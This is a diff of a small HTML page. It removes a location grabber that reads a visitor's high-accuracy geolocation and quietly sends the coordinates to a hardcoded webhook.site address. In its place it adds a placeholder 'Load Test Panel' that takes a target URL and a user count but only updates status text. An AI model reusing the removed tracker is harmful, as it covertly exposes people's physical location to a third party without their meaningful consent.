@@ -1,32 +1,99 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>Load Test Panel</title>
+
+<style>
+body{
+background:#0b0b0b;
+color:#00ff9c;
+font-family:monospace;
+text-align:center;
+padding-top:80px;
+}
+
+.panel{
+border:1px solid #00ff9c;
+width:350px;
+margin:auto;
+padding:20px;
+box-shadow:0 0 20px #00ff9c44;
+}
+
+input{
+width:90%;
+padding:8px;
+margin:6px;
+background:#111;
+border:1px solid #00ff9c;
+color:#00ff9c;
+}
+
+button{
+padding:10px 20px;
+margin:5px;
+background:#00ff9c;
+border:none;
+cursor:pointer;
+}
+
+button:hover{
+background:#00cc7a;
+}
+
+#status{
+margin-top:15px;
+}
+</style>
+
+</head>
+
 <body>
 
-<h2>正在取得位置...</h2>
+<div class="panel">
+
+<h2>LOAD TEST PANEL</h2>
+
+<input id="url" placeholder="輸入測試網址">
+
+<input id="users" placeholder="模擬使用者數">
+
+<input id="time" placeholder="測試時間(秒)">
+
+<br>
+
+<button onclick="startTest()">開始</button>
+<button onclick="stopTest()">停止</button>
+
+<p id="status">等待開始...</p>
+
+</div>
 
 <script>
 
-var webhook = "https://webhook.site/89e9774f-affe-4c04-9e2e-4708314ca8ad";
+let running = false;
 
-if(navigator.geolocation){
+function startTest(){
 
-navigator.geolocation.getCurrentPosition(function(pos){
+let url = document.getElementById("url").value;
+let users = document.getElementById("users").value;
+let time = document.getElementById("time").value;
 
-var lat = pos.coords.latitude;
-var lon = pos.coords.longitude;
-var acc = pos.coords.accuracy;
+running = true;
 
-fetch(webhook + "?lat=" + lat + "&lon=" + lon + "&acc=" + acc);
+document.getElementById("status").innerText =
+"測試開始\n網址: "+url+
+"\n模擬使用者: "+users+
+"\n測試時間: "+time+" 秒";
 
-document.body.innerHTML =
-"定位成功<br>" +
-"緯度: "+lat+"<br>" +
-"經度: "+lon+"<br>" +
-"精準度: "+acc+"公尺";
+}
 
-},{
-enableHighAccuracy:true
-});
+function stopTest(){
+
+running = false;
+
+document.getElementById("status").innerText="測試已停止";
 
 }
 
